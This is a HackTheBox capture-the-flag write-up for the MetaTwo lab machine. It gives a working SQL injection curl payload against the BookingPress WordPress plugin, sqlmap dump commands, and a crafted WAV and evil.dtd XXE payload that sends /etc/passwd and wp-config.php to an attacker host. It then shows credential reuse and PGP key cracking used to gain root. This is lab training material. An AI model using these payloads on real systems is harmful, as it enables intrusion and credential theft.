HackTheBox MetaTwo Writeup

Today We Are Going To Play With HackTheBox MetaTwo.

Let's run nmap

Found port 21,22 and 80 open.

Let's visit homepage

It's running wordpress.

Looking at /events

It's using wordpress BookingPress plugin and vulnerable to unauthenticated sql injection

Grabbing a valid wpnonce using burp

It requires a valid wpnonce otherwise it won't work. you can get a valid wpnonce by intercepting /events page's events button

Let's execute the sql payload

		
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=7a9c9c9bd464&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

Payload from This website worked after adding a valid wpnonce.

Dumping database using sqlmap

		
sqlmap -r sql.req --batch --dbs -D blog -T wp_users -C user_login,user_pass --dump

Found some usernames and password hashes.

Cracking hash using hashcat

Hashcat able to crack manager's hash.

Logging using manager's password

Let's play with this.

Wpscan scan

Page source and wpscan both confirm it's running wordpress 5.6.2, media libray vulnerable to XXE.

Creating and uploading payload.wav

		
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14./evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

Testing payload from This website.

Creating evil.dtd and hosting

		
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14./?p=%file;'>" >

Add xxe payload to evil.dtd and host on port 80.

Exfil /etc/passwd

After decoding base64 output able to get /etc/passwd.

Let's find where nginx lives

Found nginx config file here /etc/nginx/sites-available/default.

Hunting for wp-config.php file

Output of /var/www/metapress.htb/blog/wp-config.php.

Logging using ftp cred from wp-config.php

After log into ftp server found a send_email.php under mailer dir, interesting.

Looking at send_mail.php

Got some creds again.

ssh jnelson (user)

Creds from send_email.php worked with jnelson user, found an interesting directory, passpie is a password manager.

Cracking passpie pgp key with john

		
gpg2john keys > hash

Creating a hash using pgp private key.

Cracking hash with john

john cracked hash to password.

Importing and decrypting

		
gpg --import keys
gpg --decrypt root.pass

importing pgp key and decrypting root.pass.

su root (root)

i managed to log into root account using password from decrypted root.pass file.
